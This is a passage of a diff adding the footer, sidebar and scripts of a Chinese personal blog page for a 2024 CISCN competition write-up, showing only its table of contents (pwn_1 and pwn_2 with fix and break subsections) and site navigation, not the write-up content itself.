+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2024-06-25 21:21:25" itemprop="dateModified" datetime="2024-06-25T21:21:25+08:00">2024-06-25</time>
+  </span>
+  <span id="2024/06/25/2024Ciscn国赛心得/" class="item leancloud_visitors" data-flag-title="2024Ciscn国赛心得" title="阅读次数">
+      <span class="icon">
+        <i class="ic i-eye"></i>
+      </span>
+      <span class="text">阅读次数</span>
+      <span class="leancloud-visitors-count"></span>
+      <span class="text">次</span>
+  </span>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>yhuanhuan <i class="ic i-at"><em>@</em></i>
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2024/06/25/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/" title="2024Ciscn国赛心得">http://example.com/2024/06/25/2024Ciscn国赛心得/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2024/06/21/Ciscn-2022-blue/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;08&#x2F;03&#x2F;1worZdUHTMtXeP3.png" title="Ciscn_2022_blue">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> 复现</span>
+  <h3>Ciscn_2022_blue</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2024ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97"><span class="toc-number">1.</span> <span class="toc-text"> 2024Ciscn 国赛心得</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn_1"><span class="toc-number">1.0.1.</span> <span class="toc-text"> pwn_1</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#fix"><span class="toc-number">1.0.1.0.1.</span> <span class="toc-text"> fix</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#break"><span class="toc-number">1.0.1.0.2.</span> <span class="toc-text"> break</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn_2"><span class="toc-number">1.0.2.</span> <span class="toc-text"> pwn_2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#fix-2"><span class="toc-number">1.0.2.0.1.</span> <span class="toc-text"> fix</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#break-2"><span class="toc-number">1.0.2.0.2.</span> <span class="toc-text"> break</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li class="active"><a href="/2024/06/25/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/" rel="bookmark" title="2024Ciscn国赛心得">2024Ciscn国赛心得</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="yhuanhuan"
+      data-src="/images/huanhuan.png">
+  <p class="name" itemprop="name">yhuanhuan</p>
+  <div class="description" itemprop="description">欢迎来到Huan的笔记空间~~~~~~🌸</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">25</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">8</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">25</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lodWFuaHVhbjAx" title="https:&#x2F;&#x2F;github.com&#x2F;yhuanhuan01"><i class="ic i-github"></i></span>
+      <span class="exturl item email" data-url="bWFpbHRvOjI4OTQ3NDIyMTRAcXEuY29t" title="mailto:2894742214@qq.com"><i class="ic i-envelope"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Write-up/" title="分类于 Write_up">Write_up</a>
+</div>
+
+    <span><a href="/2023/08/13/Nep-wp/" title="Nep__wp">Nep__wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Write-up/" title="分类于 Write_up">Write_up</a>
+</div>
+
+    <span><a href="/2024/02/05/hgame-week1-wp/" title="hgame-week1-wp">hgame-week1-wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/04/15/%E5%8C%97%E5%8C%BA-%E6%95%B0%E4%BF%A1%E6%9D%AFWP/" title="北区-数信杯WP">北区-数信杯WP</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Write-up/" title="分类于 Write_up">Write_up</a>
+</div>
+
+    <span><a href="/2023/10/24/FSCTF-wp/" title="FSCTF_wp">FSCTF_wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/02/24/The-attacker-used-an-0day/" title="The attacker used an 0day">The attacker used an 0day</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/10/uaf/" title="uaf">uaf</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E5%A4%8D%E7%8E%B0/" title="分类于 复现">复现</a>
+</div>
+
+    <span><a href="/2023/08/03/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="国赛复现">国赛复现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/11/unlink/" title="unlink">unlink</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 web的学习">web的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/web%E7%9A%84%E5%AD%A6%E4%B9%A0/wp/" title="分类于 wp">wp</a>
+</div>
+
+    <span><a href="/2023/08/24/web-new/" title="web_new">web_new</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/04/b-canary/" title="b_canary">b_canary</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">yhuanhuan @ yhuanhuan</span>
+  </div>
+  <div class="count">
+    <span class="post-meta-item-icon">
+      <i class="ic i-chart-area"></i>
+    </span>
+    <span title="站点总字数">249k 字</span>
+
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="ic i-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:46</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2024/06/25/2024Ciscn国赛心得/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"bottom","width":150,"height":300,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
